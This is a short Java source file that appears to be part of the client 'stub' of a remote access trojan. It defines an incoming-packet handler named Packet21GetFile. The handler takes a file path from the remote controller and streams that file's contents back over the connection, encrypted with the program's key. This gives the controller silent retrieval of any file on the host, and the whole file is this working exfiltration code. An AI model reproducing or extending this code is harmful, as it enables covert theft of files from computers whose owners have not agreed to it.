package com.redpois0n.stub.packets.incoming;

import java.io.File;

import com.redpois0n.common.io.FileIO;
import com.redpois0n.stub.Connection;
import com.redpois0n.stub.Main;
import com.redpois0n.stub.packets.outgoing.Packet29SendFile;

public class Packet21GetFile extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		File file = new File(Connection.readLine());

		if (file.exists() && file.isFile()) {
			Connection.addToSendQueue(new Packet29SendFile(file.getName(), file.getAbsolutePath()));

			FileIO.writeFile(file, Connection.dos, null, Main.getKey());

			Connection.lock();
		}
	}

}
